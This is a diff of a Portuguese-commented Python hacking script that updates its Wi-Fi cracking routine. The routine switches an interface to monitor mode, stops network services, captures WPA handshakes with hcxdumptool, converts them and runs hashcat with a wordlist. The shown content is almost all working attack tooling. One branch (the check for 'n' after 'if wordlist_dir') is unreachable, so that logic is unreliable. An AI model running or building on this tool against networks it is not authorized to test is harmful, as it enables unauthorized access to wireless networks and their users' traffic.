@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-version = "v4.214dev"
+version = "v4.3dev"
 
 #########################################
 ## IMPORTAÇÃO DE BIBLIOTECAS PRINCIPAL ##
@@ -1821,6 +1821,7 @@ def wifi_hacking():
     ## FUNÇÃO PRINCIPAL    ##
     #########################
     def magic_crack(wordlist_dir):
+
         try:
             os.system('hcxpcapngtool -o WifiCrack/hash.hc22000 -E essidlist dumpfile.pcapng')
             with open('WifiCrack/hash.hc22000', 'r') as f:
@@ -1865,6 +1866,7 @@ def wifi_hacking():
             os.system(comando)
 
     def wifi_crack():
+
         dependencias = ["hcxdumptool", "hashcat", 'xterm']
         for programa in dependencias:
             if not os.popen(f'which {programa}').read():
@@ -1873,25 +1875,29 @@ def wifi_hacking():
         os.system('rm -rf WifiCrack')
         os.system('mkdir WifiCrack')
 
-        interface = interfaces()
-
-        sitwifi = input('Já existe o arquivo "WifiCrack/hash.hc22000"? (S/N) ').lower()
+        
+        sitwifi = input('Já existe o arquivo "WifiCrack/hash.hc22000"? (S/N) ')
         wordlist_dir = input('Digite o PATH das Wordlists CASO queira usar ou N: ')
 
         if sitwifi.lower() == 's':
             magic_crack(wordlist_dir)
         elif sitwifi.lower() == 'n':
+            interface = interfaces()
             minutos = int(input('\033[7;31mQuantos minutos deseja realizar o DUMP? \033[m'))
+
+            os.system(f'ip link set {interface} down') 
+            os.system(f'iwconfig {interface} mode monitor')
+            os.system(f'ip link set {interface} up') 
 
             os.system('rm dumpfile* essidlist hash.hc22000 2>/dev/null')
             os.system('systemctl stop NetworkManager.service')
             os.system('systemctl stop wpa_supplicant.service')
             try:
                 #####################################
-                ## CAPTURA DADOS DURANTE 5 MINUTOS ##
+                ## CAPTURA DADOS DURANTE X MINUTOS ##
                 #####################################
                 t.sleep(2)
-                os.system(f'hcxdumptool -i {interface} --tot={minutos} | tee dumpfile.pcapng')
+                os.system(f'hcxdumptool -i {interface} --tot={minutos} -w dumpfile.pcapng')
                 
             except KeyboardInterrupt:
                 pass
@@ -1901,14 +1907,23 @@ def wifi_hacking():
             except KeyboardInterrupt:
                 print("Processo interrompido pelo usuário.")
             finally:
+                os.system(f'ip link set {interface} down') 
+                os.system(f'iwconfig {interface} mode managed')
+                os.system(f'ip link set {interface} up') 
+                
                 os.system('systemctl restart NetworkManager.service')
                 os.system('systemctl restart wpa_supplicant.service')
-            
-            magic_crack(wordlist_dir)
+        
         else:
             print('Entrada inválida.')
+        
+        if wordlist_dir:
+            magic_crack(wordlist_dir)
+        elif wordlist_dir.lower() == 'n':
+            hash_crack()
 
     def wifi_scan():
+
         def scan(selected_iface):
             os.system(f'wash -i {selected_iface} -s -a | tee wash')
             os.system('clear')
